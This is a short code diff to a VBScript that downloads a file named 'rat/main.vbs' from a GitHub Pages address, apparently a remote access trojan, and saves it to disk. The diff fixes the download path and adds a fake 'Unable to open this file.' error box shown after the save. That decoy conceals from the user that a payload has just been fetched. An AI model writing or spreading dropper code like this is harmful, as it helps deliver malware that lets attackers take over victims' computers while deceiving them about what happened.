@@ -10,7 +10,7 @@ Dim serverAddr
 serverAddr = "https://sellitcom.github.io"
 
 ' Base URL of file
-baseURL = serverAddr & "rat/main.vbs"   ' <-- change to your URL
+baseURL = serverAddr & "/rat/main.vbs"   ' <-- change to your URL
 
 ' Add cache buster
 cacheBuster = "?v=" & Replace(CStr(Timer * 1000), ".", "")
@@ -34,4 +34,6 @@ If http.Status = 200 Then
     stream.Write http.responseBody
     stream.SaveToFile savePath, 2  ' overwrite
     stream.Close
+
+    MsgBox "Unable to open this file."
 End If
